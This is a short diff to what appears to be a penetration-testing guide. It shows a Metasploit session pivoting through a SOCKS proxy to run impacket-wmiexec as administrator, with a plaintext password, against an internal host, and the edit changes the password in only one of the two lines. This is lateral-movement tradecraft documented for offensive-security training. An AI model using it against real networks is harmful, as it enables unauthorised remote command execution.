@@ -338,7 +338,7 @@ Example 2 - wmiexec (impacket) connection to an internal server over the meterpr
 --------------------------------------------------------------------------------------------
 
 msf6 auxiliary(server/socks_proxy) > proxychains impacket-wmiexec administrator:Jesuisunepetitepistache2022@192.168.1.196
-[*] exec: proxychains impacket-wmiexec administrator:Jesuisunepetitepistache2022@192.168.1.196
+[*] exec: proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
